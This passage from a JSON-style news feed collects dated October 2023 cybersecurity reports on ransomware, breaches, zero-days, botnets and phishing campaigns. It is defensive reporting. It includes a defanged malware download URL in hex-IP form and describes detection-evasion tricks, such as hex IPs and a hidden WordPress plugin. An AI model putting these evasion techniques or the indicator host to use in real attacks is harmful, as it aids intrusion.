not specify the exact functionality or purpose of StylerServ or stylers.bin, but it is likely part of a stealthy configuration serving mechanism for other malware components.The security company says the newly identified cluster is likely a segment of a broader campaign involving more undiscovered tools and attack methods.Judging from the wide variety of distinct tools seen in the attacks and their level of customization, these appear to be disposable.Over the past year, Kaspersky observed a parallel cluster of activity from the same threat actor, different from the one seen by Check Point, with two attack variants employing legitimate VLC executables to load malware using the DLL sideloading technique.A notable malware deployed in these attacks is 'Ninja Agent,' which features file management, reverse shell, process management, and more.Other tools ToddyCat deployed in these attacks include LoFiSe (file tracker and stealer), Cobalt Strike (penetration testing suite), DropBox Uploader, and a passive UDP backdoor."
   },
   {
      "time": "2023-10-13",
      "title": "Ransomware attacks now target unpatched WS_FTP servers",
      "text": " Internet-exposed WS_FTP servers unpatched against a maximum severity vulnerability are now targeted in ransomware attacks. \"Even though Progress Software released a fix for this vulnerability in September 2023, not all of the servers have been patched. Sophos X-Ops observed unsuccessful attempts to deploy ransomware through the unpatched services.\"Fortunately, their attempt to deploy the ransomware payloads on the victim's systems was thwarted, preventing the attackers from encrypting the target's data.Even though they failed to encrypt the files, the threat actors still demanded a $500 ransom, payable by October 15, Moscow Standard Time.The low ransom demand hints at Internet-exposed and vulnerable WS_FTP servers likely being targeted in mass automated attacks or by an inexperienced ransomware operation.\"We do recommend upgrading to the most highest version which is 8.8.2. Upgrading to a patched release, using the full installer, is the only way to remediate this issue,\" Progress said.\"From our analysis of WS_FTP, we found that there are about 2.9k hosts on the internet that are running WS_FTP (and also have their webserver exposed, which is necessary for exploitation). Most of these online assets belong to large enterprises, governments and educational institutions,\" Assetnote said.Cybersecurity company Rapid7 revealed that attackers began exploiting CVE-2023-40044 on September 30, the day the PoC exploit was released."
   },
   {
      "time": "2023-10-13",
      "title": "ShellBot Uses Hex IPs to Evade Detection in Attacks on Linux SSH Servers",
      "text": " The threat actors behind ShellBot are leveraging IP addresses transformed into their hexadecimal notation to infiltrate poorly managed Linux SSH servers and deploy the DDoS malware.Developed in Perl, the malware uses the IRC protocol to communicate with a command-and-control (C2) server.The latest set of observed attacks involving ShellBot has been found to install the malware using hexadecimal IP addresses – hxxp://0x2763da4e/ which corresponds to 39.99.218[.]78 – in what's seen as an attempt to evade URL-based detection signatures.\"Due to the usage of curl for the download and its ability to support hexadecimal just like web browsers, ShellBot can be downloaded successfully on a Linux system environment and executed through Perl,\" ASEC said.The development is a sign that ShellBot continues to witness steady usage to launch attacks against Linux systems.With ShellBot capable of being used to install additional malware or launch different types of attacks from the compromised server, it's recommended that users switch to strong passwords and periodically change them to resist brute-force and dictionary attacks.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-13",
      "title": "Shadow PC warns of data breach as hacker tries to sell gamers' info",
      "text": " Shadow PC, a provider of high-end cloud computing services, is warning customers of a data breach that exposed customers' private information, as a threat actor claims to be selling the stolen data for over 500,000 customers.Shadow (Shadow) is a cloud gaming service providing users with high-end Windows PCs streamed to their local devices (PCs, laptops, smartphones, tablets, smart TVs), allowing them to run demanding AAA games on a virtual computer.According to multiple tips sent to BleepingComputer yesterday from Shadow customers, the company has begun sending data breach notifications following a successful social engineering attack targeting its employees.\"At the end of September, we were the victim of a social engineering attack targeting one of our employees,\" reads the notice.\"This highly sophisticated attack began on the Discord platform with the downloading of malware under cover of a game on the Steam platform, proposed by an acquaintance of our employee, himself a victim of the same attack.\"Based on the description of the attack, the downloaded malware was an info-stealer that successfully stole an authentication cookie that allowed the hackers to log in to the management interface of one of the company's SaaS (software-as-a-service) providers.Leveraging this access, the attacker abused the API to extract customers' full names, email addresses, dates of birth, billing addresses, and credit card expiration dates.Shadow's notice clarifies that the incident has not resulted in the exposure of account passwords or other sensitive payment/banking data.Shadow says that it has revoked the stolen authentication cookie and that the hacker's access to its systems has been blocked. Moreover, Shadow has implemented additional defenses to prevent similar incidents from occurring in the future.The firm assures the impacted customers that the compromised service provider did not hold any other user data beyond what is highlighted in the notice.BleepingComputer contacted Shadow with questions regarding the incident, and we will update this post with their statement.Last night, a threat actor claimed to be responsible for the attack and is selling the stolen database on a well-known hacking forum.The threat actor claims that they breached Shadow at the end of September and were able to steal the data for 533,624 users.\"At the end of September, I gained access to the database of the French company Shadow. It contains only customers, not all Shadow users,\" reads the for sale post.\"After an attempt at amicable settlement, which they deliberately ignored, I decided to put the database up for sale.\"The threat actor also says IP connection logs were stolen in the breach in addition to the other data already confirmed by Shadow.BleepingComputer has not independently confirmed if the sold data belongs to Shadow customers."
   },
   {
      "time": "2023-10-13",
      "title": "Apple fixes iOS Kernel zero-day vulnerability on older iPhones",
      "text": " The first zero-day (tracked as CVE-2023-42824) is a privilege escalation vulnerability caused by a weakness in the XNU kernel that can let local attackers elevate privileges on vulnerable iPhones and iPads.Apple has now also fixed the issue in iOS 16.7.1 and iPadOS 16.7.1 with improved checks, but it has yet to reveal who discovered and reported the flaw.The second one, a bug identified as CVE-2023-5217, is caused by a heap buffer overflow vulnerability within the VP8 encoding of the open-source libvpx video codec library. This flaw could let threat actors gain arbitrary code execution upon successful exploitation.Google attributed the discovery of CVE-2023-5217 to security researcher Clément Lecigne, a member of Google's Threat Analysis Group (TAG), a team of security experts known for uncovering zero-days exploited in state-backed targeted spyware attacks aimed at high-risk individuals.The list of devices impacted by the two zero-day bugs is extensive, and it includes:Since the start of the year, Apple patched 18 zero-day vulnerabilities exploited in the wild to target iPhones and Macs, including:"
   },
   {
      "time": "2023-10-12",
      "title": "\r\n\tUS Government Issues Open-Source Security Guidance for Critical Infras - Infosecurity Magazine\r\n",
      "text": " Deputy Editor, Infosecurity MagazineThe US government has issued guidance on securing open-source software (OSS) in operational technology (OT) critical infrastructure environments.The joint advisory, published by the Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), National Security Agency (NSA), and US Department of the Treasury, is designed to help senior leadership and operations personnel at OT and industrial control systems (ICS) better manage risk from OSS use.The document outlined the heightened consequences of cyber incidents in critical infrastructure organizations due to the associated life-safety implications.Additionally, the agencies noted that basic cyber hygiene practices, such as updating software in IT systems when a patch is available, due to the potential adverse effects on other dependent software and operational risks.Patching OSS in these environments is particularly challenging as it is difficult to know whether certain software modules, and their associated vulnerabilities, are present and/or exploitable.The US government therefore set out a range of recommendations to improve the security of OSS in OT/ICS, advocating a secure-by-design approach:Clayton Romans, CISA Associate Director, commented: “This guidance is another positive outcome of our partnership with the OSS community, industry and interagency partners that contributed their time and effort. We are confident that this ongoing public-private collaboration to support the OSS ecosystem will continue to grow and help further reduce risk to our nation’s critical infrastructure.”"
   },
   {
      "time": "2023-10-12",
      "title": "Microsoft: State hackers exploiting Confluence zero-day since September",
      "text": " Microsoft says a Chinese-backed threat group tracked as 'Storm-0062' (aka DarkShadow or Oro0lxy) has been exploiting a critical privilege escalation zero-day in the Atlassian Confluence Data Center and Server since September 14, 2023.Today, Microsoft Threat Intelligence analysts shared more information about Storm-0062's involvement in CVE-2023-22515's exploitation and posted four offending IP addresses on a thread on Twitter.Considering that Atlassian made security updates available in early October, Storm-0062 exploited the flaw as a zero-day bug for nearly three weeks, creating arbitrary administrator accounts on exposed endpoints.Storm-0062 is a state hacking group linked to China's Ministry of State Security and known for targeting software, engineering, medical research, government, defense, and tech firms in the U.S., U.K., Australia, and various European countries to collect intelligence.Rapid7 analysts showed how attackers could bypass existing security checks on the product and which cURL command can be used to send a crafted HTTP request on vulnerable endpoints that creates new administrator users with a password known to the attacker.Their detailed write-up also includes an additional request that ensures other users won't receive a notification about the completion of the setup, making the compromise stealthy.A week has passed since Atlassian rolled out security updates for the affected products, so users have had ample time to respond to the situation before the PoC exploit's public release.If you haven't done so yet, it is recommended to upgrade to one of the following fixed Atlassian Confluence releases: Note that CVE-2023-22515 flaw doesn't impact Confluence Data Center and Server versions before 8.0.0, so users of older releases don't need to take any action.The same applies to Atlassian-hosted instances at atlassian.net domains, which are not vulnerable to these attacks."
   },
   {
      "time": "2023-10-12",
      "title": "New WordPress backdoor creates rogue admin to hijack websites",
      "text": " A new malware has been posing as a legitimate caching plugin to target WordPress sites, allowing threat actors to create an administrator account and control the site's activity.The malware is a backdoor with a variety of functions that let it manage plugins and hide itself from active ones on the compromised websites, replace content, or redirect certain users to malicious locations.Taking a closer look at the backdoor, the researchers noticed that it came \"with a professional looking opening comment\" to disguise as a caching tool, which typically helps reduce server strain and improve page load times.The decision to mimic such a tool appears deliberate, ensuring it goes unnoticed during manual inspections. Also, the malicious plugin is set to exclude itself from the list of “active plugins” as a means to evade scrutiny.The malware features the following capabilities:At the moment, Defiant does not provide any details about the number of websites compromised with the new malware and its researchers have yet to determine the initial access vector.Typical methods for compromising a website include stolen credentials, brute-forcing passwords, or exploiting a vulnerability in an existing plugin or theme.Defiant has released a detection signature for its users of the free version of Wordfence and added a firewall rule to protect Premium, Care, and Response users from the backdoor.Hence, website owners should use strong and unique credentials for admin accounts, keep their plugins up to date, and remove unused add-ons and users."
   },
   {
      "time": "2023-10-12",
      "title": "BianLian extortion group claims recent Air Canada breach",
      "text": " The BianLian extortion group claims to have stolen 210GB of data after breaching the network of Air Canada, the country's largest airline and a founding member of Star Alliance.The threat actors also shared screenshots of the stolen data on their dark web data leak website as proof and a detailed description of what was stolen from the airline's network.BianLian claims to have exfiltrated technical and operational data spanning from 2008 to 2023, including details about the company's technical and security challenges, SQL backups, personal information of employees, data regarding vendors and suppliers, confidential documents, and archives from company databases.\"Employee personal data is only a small fraction of the valuable data over which they have lost control,\" the cybercrime gang said.\"For example, we have SQL databases with company technical and security issues. You can check it out for yourself, a demo package with screenshots is available below. Backups with this data are available on our website and at your request.\"In a statement shared with BleepingComputer today, Air Canada said they were aware of BianLian's extortion threats but didn't confirm the group's claims that they were behind the breach.\"BianLian had threatened to resort to exploiting the media in their unsuccessful extortion efforts,\" an Air Canada spokesperson told BleepingComputer via email.\"For this reason, we cannot comment on any claims made by an anonymous group based on cybercrime and we will not add anything to what we have said publicly. We trust that media will consider this and report on issues such as this responsibly.\"The Canadian airline has yet to disclose how many employees were affected by the incident, the date when its network was breached, and when the attack was detected.Air Canada also warned some of its customers in emails sent today to enable SMS-based multifactor authentication on their Aeroplan accounts and use strong passwords to defend against credential stuffing and password spraying attacks.As a result of this incident, the airline was forced to lock all 1.7 million mobile app accounts to protect its customers' data.The attackers gained access to a wealth of data in the 2018 breach, including mobile app users' names, email addresses, and phone numbers, as well as passport numbers, expiration dates, and country of issuance and residence.Air Canada said at the time that customer credit card data wasn't exposed and that no aircanada.com accounts were affected as they're not connected to the mobile app."
   },
   {
      "time": "2023-10-12",
      "title": "Simpson Manufacturing shuts down IT systems after cyberattack",
      "text": " Simpson Manufacturing disclosed via a SEC 8-K filing a cybersecurity incident that has caused disruptions in its operations, which are expected to continue.Simpson Manufacturing is an American building and structural materials producer and one of North America's dominant makers of structural connectors and anchors, with 5,150 employees and annual net sales of $2.12 billion (2022).The company states it detected IT problems and application outages this past Tuesday, which it soon realized were caused by a cyberattack. In response to the situation, Simpson took all impacted systems offline to prevent the attack's spread.\"After becoming aware of the malicious activity, the Company began taking steps to stop and remediate the activity, including taking certain systems offline.\"The statement further clarifies that the ongoing remediation process may take some time. As a result, the pause in business operations will persist.Lengthy disruptions typically result from ransomware attacks that are complex to remediate as they involve data encryption, rendering key systems and apps unusable.Also, the possibility of data theft would be a significant concern, as Simpson Manufacturing is a leader in its industry, potentially holding large amounts of proprietary information.The firm operates seven laboratories for testing new designs and materials and holds over two thousand patents and trademarks.However, the type of cybersecurity incident impacting Simpson Manufacturing has not yet been determined, and no ransomware groups have taken responsibility for an attack on the firm.The company says it has engaged leading third-party experts to aid its investigation and recovery, but both are in their initial stages.BleepingComputer has contacted Simpson Manufacturing with a request for additional information regarding the nature of the cybersecurity incident, and we will update this post as soon as we hear back."
   },
   {
      "time": "2023-10-12",
      "title": "LinkedIn Smart Links attacks return to target Microsoft accounts",
      "text": " Hackers are once again abusing LinkedIn Smart Links in phishing attacks to bypass protection measures and evade detection in attempts to steal Microsoft account credentials.Smart Links are part of LinkedIn's Sales Navigator service, used for marketing and tracking, allowing Business accounts to email content using trackable links to determine who engaged with it.Also, because Smart Link uses LinkedIn's domain followed by an eight-character code parameter, they appear to originate from a trustworthy source and bypass email protections.The email security company today reports it identified a surge in LinkedIn Smart Link abuse recently, with over 800 emails of various subjects leading a broad range of targets to phishing pages.According to Cofense, the recent attacks occurred between July and August 2023, using 80 unique Smart Links, and originated from newly created or compromised LinkedIn business accounts.Cofense data shows that the most targeted sectors of this latest campaign are finance, manufacturing, energy, construction, and healthcare.\"Despite Finance and Manufacturing having higher volumes, it can be concluded that this campaign was not a direct attack on any one business or sector but a blanket attack to collect as many credentials as possible using LinkedIn business accounts and Smart Links to carry out the attack,\" explains Cofense.The emails sent to targets use subjects relating to payments, human resources, documents, security notifications, and others, with the embedded link/button triggering a series of redirects from a \"trustworthy\" LinkedIn Smart Link.To add legitimacy to the phishing process and create a false sense of authenticity on the Microsoft login page, the Smart Link sent to victims is adjusted to contain the target's email address.The phishing page will read the email address from the link clicked by the victim and auto-fill it on the form, only expecting the victim to fill out the password, just like it happens on the legitimate login portal.The phishing page resembles a standard Microsoft login portal instead of a customized, company-specific design.While this broadens its target range, it may deter individuals familiar with their employer's unique portals.Users should be educated not to rely solely on email security tools to block threats, as phishing actors increasingly adopt tactics that abuse legitimate services to bypass these protections."
   },
   {
      "time": "2023-10-12",
      "title": "\r\n\tExploitation Accounts For 29% of Education Sector Attacks - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistThe education sector has been confirmed as a prime target for threat actors, with 29% of attacks originating from vulnerability exploitation and 30% from phishing campaigns on K-12 schools in 2023.The figures come from the latest report by Critical Start, a Managed Detection and Response (MDR) cybersecurity solutions provider.The firm’s biannual Cyber Threat Intelligence Report, published earlier today, sheds light on noteworthy cyber-threats and emerging trends affecting various industries, including finance, education manufacturing and state and local government.One of the key findings in the report is the increasing use of Quick Response (QR) codes in phishing attacks. In these attacks, cyber-criminals disguise themselves as Microsoft security notifications and embed QR codes within PNG images or PDF attachments to deceive victims.“The volume and sophistication of cyber-attacks is continuously growing and evolving, making it impossible for organizations to feel on top of internal vulnerabilities and remain cognizant of every external threat,” said Callie Guenther, senior manager of cyber-threat research at Critical Start. “To democratize cyber threat intelligence, this report highlights the most prominent security-related issues plaguing business and how they can proactively reduce cyber risk.”"
   },
   {
      "time": "2023-10-12",
      "title": "Microsoft Defender now auto-isolates compromised accounts",
      "text": " Microsoft Defender for Endpoint now uses automatic attack disruption to isolate compromised user accounts and block lateral movement in hands-on-keyboard attacks with the help of a new 'contain user' capability in public preview.In such incidents, like those involving human-operated ransomware, threat actors infiltrate networks, move laterally after escalating privileges via stolen accounts, and deploy malicious payloads.According to Microsoft, Defender for Endpoint now prevents attackers' lateral movement attempts within victims' on-premises or cloud IT infrastructure by temporarily isolating the compromised user accounts (aka suspicious identities) they might exploit to achieve their objectives.\"This on-by-default capability will identify if the compromised user has any associated activity with any other endpoint and immediately cut off all inbound and outbound communication, essentially containing them.\"According to Microsoft, when the initial stages of a human-operated attack are detected on an endpoint using signals from various Microsoft 365 Defender workloads (including identities, endpoints, email, and SaaS apps), the automated attack disruption feature will block the attack on that device.Simultaneously, Defender for Endpoint will also \"innoculate\" all other devices within the organization by blocking incoming malicious traffic, leaving the attackers with no further targets.\"This action can significantly help to reduce the impact of an attack. When an identity is contained, security operations analysts have extra time to locate, identify and remediate the threat to the compromised identity.\"Microsoft added automatic attack disruption to its Microsoft 365 Defender XDR (Extended Detection and Response) solution in November 2022 during its annual Microsoft Ignite conference for developers and IT professionals.The capability helps contain in-progress attacks and isolate affected assets automatically by limiting lateral movement across compromised networks.\"Since August 2023, more than 6,500 devices have been spared encryption from ransomware campaigns executed by hacker groups including BlackByte and Akira, and even red teams for hire,\" according to Microsoft's internal data."
   },
   {
      "time": "2023-10-12",
      "title": "Adobe Acrobat Reader Vuln Now Under Attack",
      "text": " The Cybersecurity Infrastructure & Security Agency (CISA) this week added to its catalog of known exploited vulnerabilities an Adobe Acrobat Reader use-after-free bug.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-12",
      "title": "\r\n\tCurl Releases Fixes For High-Severity Vulnerability - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistIn a recent security alert, the team behind the popular open-source tool curl has announced the release of fixes for two vulnerabilities: CVE-2023-38545 and CVE-2023-38546. Today’s release marks a crucial step in addressing these security concerns. Curl, a command-line tool for data transfer supporting various network protocols, plays a vital role in countless applications, with over 20 billion installations worldwide. Its underlying library, libcurl, also serves as a backbone for web-aware applications, making it an essential component of the internet ecosystem.“Attackers may integrate such vulnerabilities into automated tools, malware and bots, enabling automatic exploitation across various systems and applications,” explained Saeed Abbasi, manager of vulnerability and threat research at Qualys.“While the exploitation involves using a slow SOCKS5 handshake and a specifically crafted URL, it’s conceivable that the technical barrier might not be excessively high for attackers with a certain level of expertise.”The release of curl 8.4.0 aims to address these vulnerabilities, primarily focusing on CVE-2023-38545. This update ensures that curl no longer switches to local resolve mode if a hostname is too long, thus mitigating the risk of heap buffer overflows.“Organizations must act swiftly to inventory, scan, and update all systems utilizing curl and libcurl,” he warned.“In particular, the gravity of the high-severity vulnerability mandates immediate and cautious attention to safeguarding interconnected and web-aware applications, ensuring the rich data transfer functionality curl and libcurl provide remain unimpaired and secure.”Now that patches for these flaws are available, companies should update promptly to secure their systems."
   },
   {
      "time": "2023-10-11",
      "title": "Google makes passkeys the default sign-in for personal accounts",
      "text": " Google announced today that passkeys are now the default sign-in option across all personal Google Accounts across its services and platforms.After setting up a passkey linked to their device, users can sign into their Google accounts without entering a password or using 2-Step Verification (2SV) when logging in.\"This means the next time you sign in to your account, you'll start seeing prompts to create and use passkeys, simplifying your future sign-ins. It also means you'll see the 'skip password when possible' option toggled on in your Google Account settings.\"They work locally, offer a more secure and convenient alternative to traditional passwords, and enable the use of biometric sensors like fingerprint scanners and facial recognition, along with PINs, hardware security keys, or screen lock patterns, to access websites, online services, and apps.Using passkeys significantly reduces the risk of data breaches impacting other accounts and protects against phishing attacks, as they cannot be exploited to hijack accounts. They also eliminate the need to remember and manage passwords, improving security and ease of use.Passkeys are securely stored and synchronized in the cloud to prevent lockouts in the event of device loss and facilitate seamless transitions to new devices. This functionality is compatible with all major web browsers and platforms, including Windows, macOS, iOS, and ChromeOS.\"Of course, like any new beginning, the change to passkeys will take time. That's why passwords and 2SV will still work for Google Accounts,\" said Brand and Karra in May.\"We’ll keep you updated on where else you can start using passkeys across other online accounts. In the meantime, we’ll continue encouraging the industry to make the pivot to passkeys — making passwords a rarity, and eventually obsolete,\" they added today."
   },
   {
      "time": "2023-10-11",
      "title": "\r\n\tFlagstar Bank MOVEit Breach Affects 800K Customer Records - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistFlagstar Bank, a prominent Michigan-based financial services provider, has warned 837,390 of its US customers about a data breach that occurred through a third-party service provider, Fiserv. The breach exposed the personal information of a substantial number of customers. It was traced back to vulnerabilities in MOVEit Transfer, a file transfer software used by Fiserv for payment processing and mobile banking services. The unauthorized activity occurred between May 27 and 31 2023, before the vulnerability was publicly disclosed, allowing threat actors to access and obtain customer information, including names and other data elements.“This attack demonstrates that an organization’s security is only as strong as its third or fourth party’s weakest security program.”To support affected customers, Flagstar Bank has been providing complimentary identity monitoring services through Kroll for two years. This includes credit monitoring, fraud consultation and identity theft restoration. The company also recommended that all affected individuals remain vigilant, monitor their credit history, review account statements and report any suspicious activity to financial institutions.“Customers of this bank [...] will want to keep a close eye on all of their accounts, take advantage of the inevitable free credit monitoring, and they should stay alert for possible phishing attempts.”The incident marks the third significant cybersecurity breach for Flagstar Bank since 2021. The first breach happened in March 2021 when the Clop ransomware group reportedly pilfered customers’ personal data.Editorial image credit: Michael Vi / Shutterstock.com"
   },
   {
      "time": "2023-10-11",
      "title": "Air Europa data breach: Customers warned to cancel credit cards",
      "text": " Spanish airline Air Europa, the country's third-largest airline and a member of the SkyTeam alliance, warned customers on Monday to cancel their credit cards after attackers accessed their card information in a recent data breach.\"We inform you that a cybersecurity incident was recently detected in one of our systems consisting of possible unauthorized access to your bank card data,\" Air Europa said in emails sent to affected individuals and seen by BleepingComputer.\"We have secured our systems, guaranteeing the correct functioning of the service. Additionally, we have made the due notifications to the competent authorities and necessary entities (AEPD, INCIBE, banks, etc.).\"The credit card details exposed in the breach include card numbers, expiration dates, and the 3-digit CVV (Card Verification Value) code on the back of the payment cards.Air Europa also warned affected customers to ask their banks to cancel their cards used on the airline's website due to \"the risk of card spoofing and fraud\" and \"to prevent possible fraudulent use.\"Customers were also advised not to provide their personal info or card PINs to anyone contacting them over the phone or via email and not to open any links in emails or messages warning them of fraudulent operations involving their cards.The company has yet to reveal how many of its customers were affected by the data breach, the date its systems were breached, and when the incident was detected.An Air Europa spokesperson was not available for comment when contacted by BleepingComputer earlier today.The 2021 data breach affected roughly 489,000 individuals, with the attackers gaining access to their contact and bank account details (card numbers, expiration dates, and CVV codes) stored in 1,500,000 data records.While criminals used around 4,000 bank cards' data in fraudulent activities, Air Europa classified the breach as a medium-risk incident and chose not to inform the affected individuals."
   },
   {
      "time": "2023-10-11",
      "title": "Mirai DDoS malware variant expands targets with 13 router exploits",
      "text": " A Mirai-based DDoS (distributed denial of service) malware botnet tracked as IZ1H9 has added thirteen new payloads to target Linux-based routers and routers from D-Link, Zyxel, TP-Link, TOTOLINK, and others.Fortinet researchers report observing a peak in the exploitation rates around the first week of September, reaching tens of thousands of exploitation attempts against vulnerable devices.IZ1H9 compromises devices to enlist them to its DDoS swarm and then launches DDoS attacks on specified targets, presumably on the order of clients renting its firepower.The more devices and vulnerabilities targeted by a DDoS malware increased the potential to build a large and powerful botnet capable of delivering massive blows against websites.In the case of IZ1H9, Fortinet reports it uses exploits for the following flaws, dating from 2015 to 2023:The campaign also targets an unspecified CVE related to the “/cgi-bin/login.cgi” route, potentially affecting the Prolink PRC2402M router.After exploiting one of the aforementioned CVEs, an IZ1H9 payload is injected into the device containing a command to fetch a shell script downloader named “l.sh” from a specified URL.Upon execution, the script deletes logs to hide the malicious activity, and next, it fetches bot clients tailored for different system architectures.Finally, the script modifies the device’s iptables rules to obstruct connection on specific ports and make it harder to remove the malware from the device.Having done all the above, the bot establishes communication with the C2 (command and control) server and waits for commands to execute.The supported commands concern the type of DDoS attack to launch, including UDP, UDP Plain, HTTP Flood, and TCP SYN.These attacks might be helpful for propagation to adjacent devices or authenticating to IoTs for which it does not have a working exploit.Owners of IoT devices are recommended to use strong admin user credentials, update them to the latest available firmware version, and, if possible, reduce their exposure to the public internet."
   },
   {
      "time": "2023-10-11",
      "title": "Badbox Operation Targets Android Devices in Fraud Schemes",
      "text": " After a researcher discovered that an Android-based TV streaming box, known as T95, was infected with preloaded malware, researchers at Human Security released information regarding the extent of infected devices and how malicious schemes are connected to these corrupted products. Daniel Milisic, a systems security consultant, created a script alongside instructions to help other users mitigate the threat after first coming across the issue. Now, Human Security's threat intelligence and research team has dubbed the operation \"Badbox,\" which it characterizes as a complex, interconnected series of ad fraud schemes on a massive scale.Human Security describes the operation as \"a global network of consumer products with firmware backdoors installed and sold through a normal hardware supply chain.\" Once activated, the malware on the devices connect to a command-and-control (C2) server for further instructions. In tandem, a botnet known as Peachpit is integrated with Badbox, and engages in ad fraud, residential proxy services, fake email/messaging accounts, and unauthorized remote code installation.Human Security recommends that users avoid off-brand devices and be wary of clone apps that could potentially infect their device. In addition, users should consider restoring factory settings if a device is behaving oddly.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-11",
      "title": "\r\n\tNew Threat Actor “Grayling” Blamed For Espionage Campaign - Infosecurity Magazine\r\n",
      "text": " UK / EMEA News Reporter, Infosecurity MagazineSecurity researchers have shared evidence of a new APT group that targeted mainly Taiwanese organizations in a cyber-espionage campaign lasting at least four months.Dubbed “Grayling” by Symantec, the group’s activity began in February 2023 and continued until at least May 2023, stealing sensitive information from manufacturing, IT and biomedical firms in Taiwan, as well as victims in the US, Vietnam and Pacific Islands.The group deployed DLL sideloading through exported API “SbieDll_Hook” in order to load tools such as a Cobalt Strike Stager, that led to popular post-exploitation tool Cobalt Strike Beacon. It also installed “Havoc” – an open-source, post-exploitation command-and-control (C2) framework used in a similar way to Cobalt Strike.Grayling used publicly available spyware tool NetSpy, exploited legacy Windows elevation of privileges bug CVE-2019-0803, and downloaded and executed shellcode, the report noted.“Other post-exploitation activity performed by these attackers includes using kill processes to kill all processes listed in a file called processlist.txt, and downloading the publicly available credential-dumping tool Mimikatz,” explained Symantec.“While we do not see data being exfiltrated from victim machines, the activity we do see and the tools deployed point to the motivation behind this activity being intelligence gathering.”The security vendor said that Grayling’s modus operandi was fairly typical of APT groups today, in blending custom and publicly available tools; the latter to help it stay under the radar. Havoc and Cobalt Strike are particularly useful, and popular, in featuring a wide range of post-exploitation capabilities.“The use of publicly available tools can also make attribution of activity more difficult for investigators. The steps taken by the attackers, such as killing processes etc., also indicate that keeping this activity hidden was a priority for them.”Although the vendor stopped short of naming a potential nation state, it’s clear that the targets sought out by Grayling align with Beijing’s geopolitical interests."
   },
   {
      "time": "2023-10-11",
      "title": "Microsoft October 2023 Patch Tuesday fixes 3 zero-days, 104 flaws",
      "text": " Today is Microsoft's October 2023 Patch Tuesday, with security updates for 104 flaws, including three actively exploited zero-day vulnerabilities.While forty-five remote code execution (RCE) bugs were fixed, Microsoft only rated twelve vulnerabilities as 'Critical,' all of which are RCE flaws.The number of bugs in each vulnerability category is listed below:The total count of 104 flaws does not include one Chromium vulnerability tracked as CVE-2023-5346, which was fixed by Google on October 3rd and ported to Microsoft Edge.This month's Patch Tuesday fixes three zero-day vulnerabilities, with all of them exploited in attacks and two of them publicly disclosed.Microsoft classifies a vulnerability as a zero-day if it is publicly disclosed or actively exploited with no official fix available.The three actively exploited zero-day vulnerabilities in today's updates are:Microsoft has fixed an actively exploited Skype for Business vulnerability that is classified as an Elevation of Privileges bug.\"An attacker who successfully exploited the vulnerability could view some sensitive information (Confidentiality) but not all resources within the impacted component may be divulged to the attacker.,\" explains Microsoft.\"While the attacker cannot make changes to disclosed information (Integrity) or limit access to the resource (Availability).\"\"You could use this vulnerability to reach systems in the internals networks. It basically allows you to breach the internet perimeter because Skype usually is exposed on the public internet,\" Hauser told BleepingComputer.Microsoft has fixed an actively exploited vulnerability that can be used to steal NTLM hashes when opening a document in WordPad.\"To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system,\" explains Microsoft.\"Additionally, an attacker could convince a local user to open a malicious file. The attacker would have to convince the user to click a link, typically by way of an enticement in an email or instant message, and then convince them to open the specially crafted file.\"These NTLM hashes can be cracked or used in NTLM Relay attacks to gain access to the account.CVE-2023-44487 - HTTP/2 Rapid Reset AttackThis attack abuses the HTTP/2's stream cancellation feature to continuously send and cancel requests, overwhelming the target server/application and imposing a DoS state.As the feature is built into the HTTP/2 standard, there is no \"fix\" for the technique that can be implemented other than rate limiting or blocking the protocol.This flaw was disclosed today in a coordinated disclosure by Cloudflare, Amazon, and Google.Microsoft says that the CVE-2023-41763 and CVE-2023-36563 were publicly disclosed.Other vendors who released updates or advisories in October 2023 include:Below is the complete list of resolved vulnerabilities in the October 2023 Patch Tuesday updates."
   },
   {
      "time": "2023-10-11",
      "title": "Microsoft to kill off VBScript in Windows to block malware delivery",
      "text": " Microsoft is planning to phase out VBScript in future Windows releases after 30 years of use, making it an on-demand feature until it is removed.VBScript (also known as Visual Basic Script or Microsoft Visual Basic Scripting Edition) is a programming language similar to Visual Basic or Visual Basic for Applications (VBA) and was introduced almost 30 years ago, in August 1996.\"Initially, the VBScript feature on demand will be preinstalled to allow for uninterrupted use while you prepare for the retirement of VBScript.\"Features on Demand (FODs) are optional features within the Windows operating system like the .NET Framework (.NetFx3), Hyper-V, and the Windows Subsystem for Linux that aren't installed by default but can be added whenever necessary.Although not officially explained, Microsoft's decision to deprecate VBScript is likely tied to the earlier discontinuation of Internet Explorer this year. Fortunately, as a consequence, a prevalent infection vector employed by threat actors to infect Windows systems with malicious payloads has also been eliminated.This move is part of a broader strategy to mitigate the increasing prevalence of malware campaigns exploiting various Windows and Office features for infections."
   },
   {
      "time": "2023-10-11",
      "title": "New critical Citrix NetScaler flaw exposes 'sensitive' data",
      "text": " Citrix NetScaler ADC and NetScaler Gateway are impacted by a critical severity flaw that allows the disclosure of sensitive information from vulnerable appliances.The flaw is tracked as CVE-2023-4966 and has received a CVSS rating of 9.4, being remotely exploitable without requiring high privileges, user interaction, or high complexity.However, there's the prerequisite of the appliance to be configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or an AAA virtual server for it to be vulnerable to attacks.While the flaw's exploitation can lead to \"sensitive information disclosure,\" the vendor has not provided any details about what information is exposed. A second vulnerability disclosed in the same bulletin is CVE-2023-4967, a high-severity (CVSS score: 8.2) flaw carrying the same prerequisites, which can potentially cause denial of service (DoS) on vulnerable devices.The affected versions of Citrix products are:The recommended action is to upgrade to a fixed version that implements security updates addressing the two flaws. Citrix has provided no mitigation tips or workarounds this time.The target versions to upgrade to are:It is noted that version 12.1 has reached its end of life (EOL) date and will no longer be supported by Citrix. Hence, users are recommended to upgrade to a newer, actively supported release.Critical-severity flaws in Citrix products are highly sought-after by hackers, as large organizations with valuable assets use these devices."
   },
   {
